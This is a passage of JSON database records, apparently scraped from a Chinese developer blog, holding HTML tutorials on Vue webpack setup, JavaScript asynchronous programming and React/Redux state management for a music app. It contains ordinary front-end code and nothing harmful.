class=\"hljs-string\"\u003e\"./images/logo.png\"\u003c/span\u003e alt=\u003cspan class=\"hljs-string\"\u003e\"logo\"\u003c/span\u003e \u0026gt;\n        {{msg}}\n    \u0026lt;/div\u0026gt;\n\u0026lt;/template\u0026gt;\n\u0026lt;script\u0026gt;\n    \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default {\n        name:\u003cspan class=\"hljs-string\"\u003e'app'\u003c/span\u003e,\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003edata\u003c/span\u003e\u003c/span\u003e(){\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n                msg: \u003cspan class=\"hljs-string\"\u003e'hello vue !!'\u003c/span\u003e\n            }\n        }\n    }\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e修改完成后 运行 npm run dev 命令 ，获得如下效果的页面\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/26/160938b83b51babd?w=438\u0026amp;h=273\u0026amp;f=png\u0026amp;s=9619\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e热部署\u003c/h3\u003e\n\u003cp\u003e在上一步中，如果我们修改app.vue文件中的msg的参数，可以看到页面会自动刷新。但是此时是页面全局刷新的，如果我们只想局部刷新即只刷新修改的部分，需要使用webpack的HotModuleReplacementPlugin插件，在webpack.config.js的plugins中添加下面的信息:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enew webpack.HotModuleReplacementPlugin()\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后去package.json中，script 里面dev的值中加上 --hot -only\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    \u003cspan class=\"hljs-string\"\u003e\"dev\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"webpack-dev-server  --hot-only --open\"\u003c/span\u003e,\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后重启服务，再修改 msg 的值，会发现此时值的改变是局部刷新的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e生产环境\u003c/h3\u003e\n\u003cp\u003e如果我们在浏览器的控制台中发现有如下提示\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/27/16093904b1682b50?w=516\u0026amp;h=143\u0026amp;f=png\u0026amp;s=8665\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n意思时说项目现在运行在开发环境中，在部署到正式环境下时，要确保它是处于production的模式。需要将代码打包部署到生产环境时需要进行如下配置：\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar webpack = require(\u003cspan class=\"hljs-string\"\u003e'webpack'\u003c/span\u003e)\nmodule.exports = {\n// ...\nplugins: [\n// ...\n    new webpack.DefinePlugin({\n        \u003cspan class=\"hljs-string\"\u003e'process.env'\u003c/span\u003e: {\n            NODE_ENV: \u003cspan class=\"hljs-string\"\u003e'\"production\"'\u003c/span\u003e\n        }\n    }),\n    new webpack.optimize.UglifyJsPlugin({\n        compress: {\n            warnings: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n        }\n    })\n]}\n\u003c/code\u003e\u003c/pre\u003e","buildTime":"1514973058.5713","__v":0}
{"_id":{"$oid":"5a4cc38785472a29ac40335b"},"id":"5a448171f265da433227de2e","author":{"$oid":"5a4b76a1b11e1a170cb138d0"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"javascript异步编程(一)-现状","meta":{"likeCount":0},"tag":["JavaScript"],"comment":[],"shortContent":"写在前面, 这个话题其实还挺大的, 我自己恐怕力有不逮, 所以只能算是笔记总结, 写的肯定会有点简略. 有错误实在太正常了. 希望能多多指教. 这篇文章仅仅是解释一下现有的异步编程方案不涉及具体原理, 但是我的想法是试试看能不能每个方案都自己实现一遍, 所以可能是系列文章也可能…","content":"\u003cp\u003e写在前面, 这个话题其实还挺大的, 我自己恐怕力有不逮, 所以只能算是笔记总结, 写的肯定会有点简略. 有错误实在太正常了. 希望能多多指教.\u003c/p\u003e\n\u003cp\u003e这篇文章仅仅是解释一下现有的异步编程方案不涉及具体原理, 但是我的想法是试试看能不能每个方案都自己实现一遍, 所以可能是\u003cstrong\u003e系列文章\u003c/strong\u003e也可能就此太监了.\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e回调函数\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609b999bcfaf753?w=720\u0026amp;h=511\u0026amp;f=png\u0026amp;s=383865\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e想必大家都看过上面的图片, 虽然不是js代码, 甚至不是回调, 但是各位同学估计对callback hell感同身受.  但是事实上回调函数跟异步编程并没有必然的联系. 回调只是一种设计模式. 同步代码同样可以使用回调只是大部分时候会让人觉得多此一举而已.\u003c/p\u003e\n\u003cp\u003e大家都知道回调并不是那么优雅, 很多时候代码可能写成这样:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003easyncJob1(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  asyncJob2(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    asyncJob3(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n      \u003cspan class=\"hljs-comment\"\u003e// your code\u003c/span\u003e\n    })\n  })\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e虽然问题算是解决了吧, 但是代码看着真是令人头痛. 玩意逻辑稍微复杂一点说不定真会出现下面的情况:\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609b999bc6c4ada?w=687\u0026amp;h=983\u0026amp;f=png\u0026amp;s=104806\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e大概美军也是回调写多了吧2333.\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e事件驱动\u003c/h2\u003e\n\u003cp\u003e大部分gui程序都是采用事件驱动, web当然也不例外, 最典型的就是dom事件:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003ediv.on(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-comment\"\u003e// balabala\u003c/span\u003e\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个几乎都是跟回调和事件循环相关的, 后面会详细讲到的.\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003ePromise\u003c/h2\u003e\n\u003cp\u003e根据promise/A+的规范:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e一个Promise必须处在其中之一的状态：pending, fulfilled 或 rejected.\n如果是pending状态,则promise可以转换到fulfilled或rejected状态。\n如果是fulfilled状态,则promise不能转换成任何其它状态。\n如果是rejected状态,则promise不能转换成任何其它状态。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003ePromise都会有个then方法, 制定了fulfilled和rejected两种请况的回调, 同时then会返回一个Promise对象, 这就允许我们链式调用了:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eajax(\u003cspan class=\"hljs-string\"\u003e'xxx'\u003c/span\u003e).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e =\u0026gt;\u003c/span\u003e res).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e =\u0026gt;\u003c/span\u003e res)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e虽然Promise的方案比回调已经好太多了. 但是不难发现多个then其实未必比回调好看太多, 只能说把回调铺平了. 可能Promise并不是最优雅的解决方案.\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003egenerator\u003c/h2\u003e\n\u003cp\u003egenerator在各个语言里都有出现, python,c#等, 这里不说概念, 只说在js里该怎么使用就行, 基本理解就是generator是拥有多个返回值的函数, 每次调用next就会调用一次返回. 这就是所谓 \u003cstrong\u003e控制权移交\u003c/strong\u003e, 当然这样不足以体现其优越性, generator最重要的特性就是\u003cstrong\u003e分步数据传递\u003c/strong\u003e: next的参数可以作为上次yield的返回值, 其实直觉上不是很能理解, 不过我们这里只要知道有这么个东西就成, 下面是代码示例:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e f = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e* (\u003cspan class=\"hljs-params\"\u003ex\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e y = \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e x + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n\u0009\u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e y + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e y\n}\n\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e t = f(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e s = t.next()\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(s) \u003cspan class=\"hljs-comment\"\u003e// 2\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e p = t.next(\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) \u003cspan class=\"hljs-comment\"\u003e// 这里的4作为上次yield的返回值\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(p) \u003cspan class=\"hljs-comment\"\u003e// 5\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e有这么一个特性, 那么下面的操作性就很强了, 比如tj的著名的co:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eco(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e* (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e result = \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e.resolve(\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result;\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003evalue\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(value);\n}, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eerr\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.error(err.stack);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以说写法已经很同步了. 当然这个也不是最终的解决方案, 不然为什么koa2要用async/await呢hhh\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003easync/await\u003c/h2\u003e\n\u003cp\u003e同样对于async/await 我们先不纠结其原理, 我们只需要知道它是generator和promise二者结合起来的语法糖(不过也真够甜的)\u003c/p\u003e\n\u003cp\u003e每个async必然返回一个Promise对象, 所以async会像瘟疫一个把你的每个函数都变成async函数, 所谓可以async的终将async, 下面是例子:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// Promise的解决方案\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003efoo\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e ajax(\u003cspan class=\"hljs-string\"\u003e'xxx'\u003c/span\u003e).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e =\u0026gt;\u003c/span\u003e res).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e =\u0026gt;\u003c/span\u003e res)\n}\n\n\n\u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ebar\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e response = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e ajax(\u003cspan class=\"hljs-string\"\u003e'xxx'\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(response)\n  } \u003cspan class=\"hljs-keyword\"\u003ecatch\u003c/span\u003e (e) {\n    \u003cspan class=\"hljs-keyword\"\u003ethrow\u003c/span\u003e e\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e是不是优雅了太多, 除了一大片async/await, 不过也算小小的代价.\u003c/p\u003e\n\u003cp\u003e利用午休时间码了出来, 不知道有多少\u003cstrong\u003e错误\u003c/strong\u003e呢hhh\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609b999bcae4325?w=897\u0026amp;h=626\u0026amp;f=png\u0026amp;s=179677\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n","buildTime":"1514971470.9772","__v":0}
{"_id":{"$oid":"5a4cc1fa37991328ecbc7463"},"id":"5a4a2e896fb9a045132b0ce6","author":{"$oid":"5a4cc1f937991328ecbc7449"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/1/160b24a17da17d7c?w=774\u0026h=45\u0026f=png\u0026s=3812","https://user-gold-cdn.xitu.io/2018/1/1/160b24b6c0387039?w=785\u0026h=261\u0026f=png\u0026s=45294","https://user-gold-cdn.xitu.io/2018/1/2/160b58508511392e?w=366\u0026h=16\u0026f=png\u0026s=392","https://user-gold-cdn.xitu.io/2018/1/3/160ba0518b76e674?w=434\u0026h=877\u0026f=gif\u0026s=5014616","https://user-gold-cdn.xitu.io/2018/1/3/160b9c7e65e66d85?w=1624\u0026h=621\u0026f=png\u0026s=104235","https://user-gold-cdn.xitu.io/2018/1/3/160b9ff631af603d?w=434\u0026h=880\u0026f=gif\u0026s=2088569"],"screenShot":null}],"title":"React全家桶构建一款Web音乐App实战（五）：歌曲状态管理及播放功能实现","meta":{"likeCount":0},"tag":["React.js","JavaScript","Redux","前端"],"comment":[],"shortContent":"什么是Redux？Redux是一个状态的容器，是一个应用数据流框架，主要用作应用状态的管理。它用一个单独的常量状态树（对象）来管理保存整个应用的状态，这个对象不能直接被修改。Redux中文文档见http://www.redux.org.cn 在我们的应用中有很多歌曲列表页，点击…","content":"\u003cblockquote\u003e\n\u003cp\u003e内容较长，请耐心阅读\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这一节使用Redux来管理歌曲状态，实现核心播放功能\u003c/p\u003e\n\u003cp\u003e什么是\u003cstrong\u003eRedux\u003c/strong\u003e？Redux是一个状态的容器，是一个应用数据流框架，主要用作应用状态的管理。它用一个单独的常量状态树（对象）来管理保存整个应用的状态，这个对象不能直接被修改。Redux中文文档见\u003ca target=\"_blank\" href=\"http://www.redux.org.cn\"\u003ehttp://www.redux.org.cn\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRedux不与任何框架耦合，在React中使用Redux提供了\u003cstrong\u003ereact-redux\u003c/strong\u003e库\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e使用Redux管理歌曲相关状态属性\u003c/h3\u003e\n\u003cp\u003e在我们的应用中有很多歌曲列表页，点击列表页的歌曲就会播放点击的歌曲，同时列表页还有播放全部按钮，点击后当前列表的所有歌曲会添加到播放列表中，每一个歌曲列表都是一个组件，相互独立，没有任何关系。歌曲播放组件需要播放的歌曲，歌曲列表还有一个是否显示播放页属性，它们统一使用redux来管理。为了达到背景播放的目的，将歌曲播放组件放置到App组件内路由相关组件外，也就是每个列表页组件最外层的组件，当App组件挂载后，播放组件会一直存在整个应用中不会被销毁（除退出应用程序之外）。\u003c/p\u003e\n\u003cp\u003e首先安装\u003cstrong\u003eredux\u003c/strong\u003e和\u003cstrong\u003ereact-redux\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm install redux react-redux --save\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ereact-redux库包含了\u003cstrong\u003e容器组件\u003c/strong\u003e和\u003cstrong\u003e展示组件\u003c/strong\u003e相分离的开发思想，在最顶层组件使用redux，其余内部组件仅仅用来展示，所有数据通过props传入\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e容器组件\u003c/th\u003e\n\u003cth\u003e展示组件\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e位置\u003c/td\u003e\n\u003ctd\u003e最顶层，路由处理\u003c/td\u003e\n\u003ctd\u003e中间和子组件\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e读取数据\u003c/td\u003e\n\u003ctd\u003e从 Redux 获取 state\u003c/td\u003e\n\u003ctd\u003e从 props 获取数据\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e修改数据\u003c/td\u003e\n\u003ctd\u003e向 Redux 派发 actions\u003c/td\u003e\n\u003ctd\u003e从 props 调用回调函数\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch4 class=\"heading\"\u003e状态设计\u003c/h4\u003e\n\u003cp\u003e通常把redux相关操作的js文件放置在同一个文件夹下，这里在src下新建\u003cstrong\u003eredux\u003c/strong\u003e目录，然后新建\u003cstrong\u003eactions.js\u003c/strong\u003e、\u003cstrong\u003eactionTypes.js\u003c/strong\u003e、\u003cstrong\u003ereducers.js\u003c/strong\u003e和\u003cstrong\u003estore.js\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eactionTypes.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//显示或隐藏播放页面\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const SHOW_PLAYER = \u003cspan class=\"hljs-string\"\u003e\"SHOW_PLAYER\"\u003c/span\u003e;\n//修改当前歌曲\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const CHANGE_SONG = \u003cspan class=\"hljs-string\"\u003e\"CHANGE_SONG\"\u003c/span\u003e;\n//从歌曲列表中移除歌曲\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const REMOVE_SONG_FROM_LIST = \u003cspan class=\"hljs-string\"\u003e\"REMOVE_SONG\"\u003c/span\u003e;\n//设置歌曲列表\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const SET_SONGS = \u003cspan class=\"hljs-string\"\u003e\"SET_SONGS\"\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eactionTypes.js存放要执行的操作常量\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eactions.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport * as ActionTypes from \u003cspan class=\"hljs-string\"\u003e\"./actionTypes\"\u003c/span\u003e\n/**\n * Action是把数据从应用传到store的有效载荷。它是store数据的唯一来源\n */\n//Action创建函数，用来创建action对象。使用action创建函数更容易被移植和测试\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e showPlayer(showStatus) {\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e:ActionTypes.SHOW_PLAYER, showStatus};\n}\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e changeSong(song) {\n \u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e:ActionTypes.CHANGE_SONG, song};\n}\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e removeSong(id) {\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e:ActionTypes.REMOVE_SONG_FROM_LIST, id};\n}\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eSongs(songs) {\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e:ActionTypes.SET_SONGS, songs};\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eactions.js存放要操作的对象，必须有一个\u003cstrong\u003etype\u003c/strong\u003e属性表示要执行的操作。当应用规模越来越大的时候最好分模块定义\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ereducers.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport { combineReducers } from \u003cspan class=\"hljs-string\"\u003e'redux'\u003c/span\u003e\nimport * as ActionTypes from \u003cspan class=\"hljs-string\"\u003e\"./actionTypes\"\u003c/span\u003e\n\n/**\n * reducer就是一个纯函数，接收旧的state和action，返回新的state\n */\n\n//需要存储的初始状态数据\nconst initialState = {\n        showStatus: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,  //显示状态\n        song: {},  //当前歌曲\n        songs: []  //歌曲列表\n    };\n\n//拆分Reducer\n//显示或隐藏播放状态\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e showStatus(showStatus = initialState.showStatus, action) {\n    switch (action.type) {\n        \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e ActionTypes.SHOW_PLAYER:\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e action.showStatus;\n        default:\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e showStatus;\n    }\n}\n//修改当前歌曲\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e song(song = initialState.song, action) {\n    switch (action.type) {\n        \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e ActionTypes.CHANGE_SONG:\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e action.song;\n        default:\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e song;\n    }\n}\n//添加或移除歌曲\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e songs(songs = initialState.songs, action) {\n    switch (action.type) {\n        \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e ActionTypes.SET_SONGS:\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e action.songs;\n        \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e ActionTypes.REMOVE_SONG_FROM_LIST:\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e songs.filter(song =\u0026gt; song.id !== action.id);\n        default:\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e songs;\n    }\n}\n//合并Reducer\nconst reducer = combineReducers({\n    showStatus,\n    song,\n    songs\n});\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default reducer\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ereducers.js存放用来更新当前播放歌曲，播放歌曲列表和显示或隐藏播放页状态的纯函数。一定要保证reducer函数的纯净，永远不要有以下操作\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e修改传入参数\u003c/li\u003e\n\u003cli\u003e执行有副作用的操作，如 API 请求和路由跳转\u003c/li\u003e\n\u003cli\u003e调用非纯函数，如 Date.now() 或 Math.random()\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003ccode\u003estore.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport {createStore} from \u003cspan class=\"hljs-string\"\u003e\"redux\"\u003c/span\u003e\nimport reducer from \u003cspan class=\"hljs-string\"\u003e\"./reducers\"\u003c/span\u003e\n\n //创建store\nconst store = createStore(reducer);\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default store\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来在应用中加入redux，让App中的组件连接到redux，react-redux提供了\u003cstrong\u003eProvider组件\u003c/strong\u003e和\u003cstrong\u003econnect方法\u003c/strong\u003e。Provider用来传递store，connect用来将组件连接到redux，任何一个从 connect() 包装好的组件都可以得到一个 dispatch 方法作为组件的 props，以及得到全局 state 中所需的任何内容\u003c/p\u003e\n\u003cp\u003e在components目录下新建一个\u003cstrong\u003eRoot.js\u003c/strong\u003e用来包裹App组件并且传递store\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eRoot.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport React from \u003cspan class=\"hljs-string\"\u003e\"react\"\u003c/span\u003e\nimport {Provider} from \u003cspan class=\"hljs-string\"\u003e\"react-redux\"\u003c/span\u003e\nimport store from \u003cspan class=\"hljs-string\"\u003e\"../redux/store\"\u003c/span\u003e\nimport App from \u003cspan class=\"hljs-string\"\u003e\"./App\"\u003c/span\u003e\n\nclass Root extends React.Component {\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n\u0009    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n\u0009        \u0026lt;Provider store={store}\u0026gt;\n\u0009            \u0026lt;App/\u0026gt;\n\u0009        \u0026lt;/Provider\u0026gt;\n\u0009    );\n    }\n}\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default Root\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eProvider接收一个store对象\u003c/p\u003e\n\u003cp\u003e修改\u003cstrong\u003eindex.js\u003c/strong\u003e，将App组件换成Root组件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//import App from \u003cspan class=\"hljs-string\"\u003e'./components/App'\u003c/span\u003e;\nimport Root from \u003cspan class=\"hljs-string\"\u003e'./components/Root'\u003c/span\u003e;\n//ReactDOM.render(\u0026lt;App /\u0026gt;, document.getElementById(\u003cspan class=\"hljs-string\"\u003e'root'\u003c/span\u003e));\nReactDOM.render(\u0026lt;Root /\u0026gt;, document.getElementById(\u003cspan class=\"hljs-string\"\u003e'root'\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e操作状态\u003c/h4\u003e\n\u003cp\u003e使用connect方法将\u003ca target=\"_blank\" 